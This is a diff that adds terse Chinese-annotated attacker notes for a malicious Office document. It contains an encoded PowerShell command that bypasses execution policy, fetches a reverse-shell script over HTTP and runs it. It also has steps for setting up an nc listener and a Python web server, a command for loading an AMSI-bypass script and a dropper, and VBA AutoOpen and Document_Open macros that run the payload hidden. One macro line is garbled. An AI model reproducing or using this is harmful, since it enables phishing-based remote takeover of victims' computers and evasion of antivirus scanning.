@@ -1,0 +1,35 @@
+powershell -exec bypass -enc IABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADgAMAAwADAALwByAGUAcwBoAGUAbABsAC4AcABzADEAJwApAA==
+
+nc监听端口
+一修改reshell.ps1的ip和端口为nc的ip和端口
+python -m http.server
+
+
+$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://httpip/Amsibypass.ps1'); IEX (New-Object Net.WebClient).DownloadString('http://httpip/drop.ps1')" 
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd)) | clip
+
+宏
+Sub Document_Open() 
+ MyMacro 
+End Sub 
+ 
+Sub AutoOpen() 
+ MyMacro 
+End Sub 
+ 
+Sub MyMacro() 
+ Dim str As String 
+
+ 
+ 
+ str = "powershell -exec bypass -enc IABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADgAMAAwADAALwByAGUAcwBoAGUAbABsAC4AcABzADEAJwApAA==" 
+ Shell str, vbHide 
+Entr, vbHide
+End Sub
+
+ 
+Sub AutoOpen()
+ Dim str As String
+ str = "powershell -exec bypass -enc IABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADgAMAAwADAALwByAGUAcwBoAGUAbABsAC4AcABzADEAJwApAA=="
+ Shell str, vbHide
+End Sub
